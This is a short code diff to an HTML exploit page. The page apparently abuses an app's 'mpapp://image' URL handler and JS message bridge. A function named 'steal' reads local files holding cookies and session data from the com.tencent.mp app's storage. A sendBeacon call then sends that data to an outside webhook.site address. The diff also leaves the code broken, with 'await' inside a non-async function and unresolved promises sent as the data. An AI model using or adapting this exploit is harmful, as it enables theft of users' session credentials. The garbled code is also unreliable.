@@ -26,15 +26,13 @@ MPJSMessageBridge.postMessage(JSON.stringify({
 }));
   
   
-async function steal(path){
+function steal(path){
   const r = await fetch("mpapp://image?path=" + encodeURIComponent(path));
   return await r.text();  
 }
-(async () => {
-  const cookie = await steal("file:///data/data/com.tencent.mp/files/mmkv/docker");
-  const sess   = await steal("file:///data/data/com.tencent.mp/files/mmkv/config_info");
-  navigator.sendBeacon("https://bd6d7b86-e1c0-4a3c-ad24-3e1efb7414b8.webhook.site/c", cookie + "\n====\n" + sess);
-})();
+const cookie = steal("file:///data/data/com.tencent.mp/files/mmkv/docker");
+const sess   = steal("file:///data/data/com.tencent.mp/files/mmkv/config_info");
+navigator.sendBeacon("https://bd6d7b86-e1c0-4a3c-ad24-3e1efb7414b8.webhook.site/c", cookie + "\n====\n" + sess);
 </script>
 </body>
 </html>
